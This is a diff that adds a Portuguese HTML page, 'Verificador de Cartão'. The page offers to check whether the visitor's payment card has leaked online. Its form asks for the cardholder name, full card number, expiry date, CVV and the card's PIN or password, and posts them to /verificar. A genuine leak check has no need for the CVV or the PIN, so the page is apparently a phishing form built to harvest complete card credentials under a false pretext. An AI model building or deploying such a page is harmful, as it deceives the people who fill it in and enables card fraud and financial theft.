@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/styles.css">
+  <title>Verificador de Cartão</title>
+</head>
+<body>
+  <div class="container">
+    <div class="card-container">
+      <div class="card">
+        <div class="card-logo"></div>
+        <div class="card-chip"></div>
+        <div class="card-number" id="cardNumber">0000 0000 0000 0000</div>
+        <div class="card-details">
+          <div class="card-expiry" id="cardExpiry">MM/AA</div>
+          <div class="card-cvv" id="cardCvv">000</div>
+        </div>
+        <div class="card-name" id="cardName">Nome no cartão</div>
+      </div>
+    </div>
+    <div class="form-container">
+      <h1>Veja se seu cartão vazou na internet</h1>
+      <form action="/verificar" method="post" autocomplete="off">
+        <input type="text" name="nomeCartao" placeholder="Nome no cartão" required oninput="updateCardName(this.value)">
+        <input type="text" name="numeroCartao" placeholder="Número do cartão" required oninput="formatCardNumber(this)" maxlength="19">
+        <div class="form-row">
+          <input type="text" name="dataExpiracao" placeholder="MM/AA" required oninput="formatCardExpiry(this)" maxlength="5">
+          <input type="text" name="cvv" placeholder="CVV" required oninput="formatCardCvv(this)" maxlength="3">
+        </div>
+        <input type="password" name="senhaCartao" placeholder="Senha do cartão" required>
+        <button type="submit">Verificar</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function updateCardName(name) {
+      document.getElementById('cardName').textContent = name || 'Nome no cartão';
+    }
+
+    function formatCardNumber(input) {
+      let number = input.value.replace(/\D/g, '');
+      number = number.replace(/(.{4})/g, '$1 ').trim();
+      input.value = number;
+      document.getElementById('cardNumber').textContent = number || '0000 0000 0000 0000';
+    }
+
+    function formatCardExpiry(input) {
+      let expiry = input.value.replace(/\D/g, '');
+      if (expiry.length > 2) {
+        expiry = expiry.slice(0, 2) + '/' + expiry.slice(2);
+      }
+      input.value = expiry;
+      document.getElementById('cardExpiry').textContent = expiry || 'MM|AA';
+    }
+
+    function formatCardCvv(input) {
+      let cvv = input.value.replace(/\D/g, '').slice(0, 3);
+      input.value = cvv;
+      document.getElementById('cardCvv').textContent = cvv || '000';
+    }
+  </script>
+</body>
+</html>
